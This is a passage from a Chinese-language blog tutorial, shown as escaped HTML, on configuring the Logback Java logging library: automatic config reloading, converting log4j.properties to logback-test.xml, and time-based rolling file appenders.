class=&quot;hljs-keyword&quot;&gt;as&lt;/span&gt; safe fallback point&lt;br/&gt;&lt;span class=&quot;hljs-number&quot;&gt;13&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54&lt;/span&gt;:&lt;span class=&quot;hljs-number&quot;&gt;54.853&lt;/span&gt; [main] DEBUG com.itwanger.Test - logback&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;4）自动重载配置&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;之前提到 Logback 很强的一个功能就是支持自动重载配置，那想要启用这个功能也非常简单，只需要在 configuration 元素上添加 &lt;code&gt;scan=true&lt;/code&gt; 即可。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;scan&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;...&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认情况下，扫描的时间间隔是一分钟一次。如果想要调整时间间隔，可以通过 scanPeriod 属性进行调整，单位可以是毫秒（milliseconds）、秒（seconds）、分钟（minutes）或者小时（hours）。&lt;/p&gt;
&lt;p&gt;下面这个示例指定的时间间隔是 30 秒：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs r&quot;&gt;&amp;lt;configuration scan=&lt;span class=&quot;hljs-string&quot;&gt;&quot;true&quot;&lt;/span&gt; scanPeriod=&lt;span class=&quot;hljs-string&quot;&gt;&quot;30 seconds&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;...&lt;/span&gt;&lt;br/&gt;&amp;lt;/configuration&amp;gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意：如果指定了时间间隔，没有指定时间单位，默认的时间单位为毫秒。&lt;/p&gt;
&lt;p&gt;当设置 &lt;code&gt;scan=true&lt;/code&gt; 后，Logback 会起一个 ReconfigureOnChangeTask 的任务来监视配置文件的变化。&lt;/p&gt;
&lt;h3 id=&quot;h03log4jpropertieslogbacktestxml&quot;&gt;&lt;span&gt;03、把 log4j.properties 转成 logback-test.xml&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;如果你的项目以前用的 Log4j，那么可以通过下面这个网址把 log4j.properties 转成 logback-test.xml：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;http://logback.qos.ch/translator/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把之前 log4j.properties 的内容拷贝一份：&lt;/p&gt;
&lt;pre readability=&quot;10.5&quot;&gt;
&lt;code class=&quot;hljs perl&quot; readability=&quot;15&quot;&gt;&lt;br/&gt;log4j.rootLogger = debug,stdout,D,E&lt;p&gt;&lt;br/&gt;log4j.appender.stdout = org.apache.log4j.ConsoleAppender&lt;br/&gt;log4j.appender.stdout.Target = System.out&lt;br/&gt;log4j.appender.stdout.layout = org.apache.log4j.PatternLayout&lt;br/&gt;log4j.appender.stdout.layout.ConversionPattern = [%-&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;p] %d{yyyy-MM-dd HH:mm:ss,SSS} method:%l%n%m%n&lt;/p&gt;&lt;p&gt;&lt;br/&gt;log4j.appender.D = org.apache.log4j.DailyRollingFileAppender&lt;br/&gt;log4j.appender.D.File = debug.log&lt;br/&gt;log4j.appender.D.Append = true&lt;br/&gt;log4j.appender.D.Threshold = DEBUG &lt;br/&gt;log4j.appender.D.layout = org.apache.log4j.PatternLayout&lt;br/&gt;log4j.appender.D.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss}  [ %t:%r ] - [ %p ]  %m%n&lt;/p&gt;&lt;p&gt;&lt;br/&gt;log4j.appender.E = org.apache.log4j.DailyRollingFileAppender&lt;br/&gt;log4j.appender.E.File =error.log &lt;br/&gt;log4j.appender.E.Append = true&lt;br/&gt;log4j.appender.E.Threshold = ERROR &lt;br/&gt;log4j.appender.E.layout = org.apache.log4j.PatternLayout&lt;br/&gt;log4j.appender.E.layout.ConversionPattern = %d{yyyy-MM-dd HH:mm:ss}  [ %t:%r ] - [ %p ]  %m%n&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;粘贴到该网址的文本域：&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-10.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;点击「Translate」，可以得到以下内容：&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;6&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;stdout&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.ConsoleAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Target&lt;/span&gt;&amp;gt;&lt;/span&gt;System.out&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;Target&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;[%-5p] %d{yyyy-MM-dd HH:mm:ss,SSS} method:%l%n%m%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;D&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;true&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;debug.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%d{yyyy-MM-dd HH:mm:ss} [ %t:%r ] - [ %p ] %m%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;DEBUG&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;E&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;error.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;true&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%d{yyyy-MM-dd HH:mm:ss} [ %t:%r ] - [ %p ] %m%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.classic.filter.ThresholdFilter&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;ERROR&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;level&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;filter&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;level&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;debug&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;stdout&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;D&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender-ref&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;E&quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;root&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以确认一下内容，发现三个 appender 都在。&lt;/p&gt;
&lt;img src=&quot;http://www.itwanger.com/assets/images/2020/11/java-logback-11.png&quot; alt=&quot;&quot; title=&quot;&quot;/&gt;&lt;p&gt;但是呢，转换后的文件并不能直接使用，需要稍微做一些调整，因为：&lt;/p&gt;
&lt;p&gt;第一，日志的格式化有细微的不同，Logback 中没有 &lt;code&gt;%l&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;第二，RollingFileAppender 需要指定 RollingPolicy 和 TriggeringPolicy，前者负责日志的滚动功能，后者负责日志滚动的时机。如果 RollingPolicy 也实现了 TriggeringPolicy 接口，那么只需要设置 RollingPolicy 就好了。&lt;/p&gt;
&lt;p&gt;TimeBasedRollingPolicy 和 SizeAndTimeBasedRollingPolicy 是两种最常用的滚动策略。&lt;/p&gt;
&lt;p&gt;TimeBasedRollingPolicy 同时实现了 RollingPolicy 与 TriggeringPolicy 接口，因此使用 TimeBasedRollingPolicy 的时候就可以不指定 TriggeringPolicy。&lt;/p&gt;
&lt;p&gt;TimeBasedRollingPolicy 可以指定以下属性：&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;fileNamePattern，用来定义文件的名字（必选项）。它的值应该由文件名加上一个 &lt;code&gt;%d&lt;/code&gt; 的占位符。&lt;code&gt;%d&lt;/code&gt; 应该包含 &lt;code&gt;java.text.SimpleDateFormat&lt;/code&gt; 中规定的日期格式，缺省是 &lt;code&gt;yyyy-MM-dd&lt;/code&gt;。滚动周期是通过 fileNamePattern 推断出来的。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;maxHistory，最多保留多少数量的日志文件（可选项），将会通过异步的方式删除旧的文件。比如，你指定按月滚动，指定 &lt;code&gt;maxHistory = 6&lt;/code&gt;，那么 6 个月内的日志文件将会保留，超过 6 个月的将会被删除。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;totalSizeCap，所有日志文件的大小（可选项）。超出这个大小时，旧的日志文件将会被异步删除。需要配合 maxHistory 属性一起使用，并且是第二条件。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;来看下面这个 RollingFileAppender 配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;D&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;file&lt;/span&gt;&amp;gt;&lt;/span&gt;debug.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;file&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;debug.%d{yyyy-MM-dd}.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;30&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;3GB&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%relative [%thread] %level %logger{35} - %msg%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;基于按天滚动的文件策略，最多保留 30 天，最大大小为 30G。&lt;/p&gt;
&lt;p&gt;SizeAndTimeBasedRollingPolicy 比 TimeBasedRollingPolicy 多了一个日志文件大小设定的属性：maxFileSize，其他完全一样。&lt;/p&gt;
&lt;p&gt;基于我们对 RollingPolicy 的了解，可以把 logback-test.xml 的内容调整为以下内容：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;stdout&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.ConsoleAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Target&lt;/span&gt;&amp;gt;&lt;/span&gt;System.out&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;Target&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%d{HH:mm:ss.SSS} [%thread] %level %logger{36} - %msg%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;D&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;true&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;Append&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;debug.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;debug.%d{yyyy-MM-dd}.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;fileNamePattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;30&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;maxHistory&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;3GB&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;totalSizeCap&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;%relative [%thread] %-5level %logger{35} - %msg%n&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;pattern&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;encoder&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;appender&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;E&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;error.log&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;File&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;rollingPolicy&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span 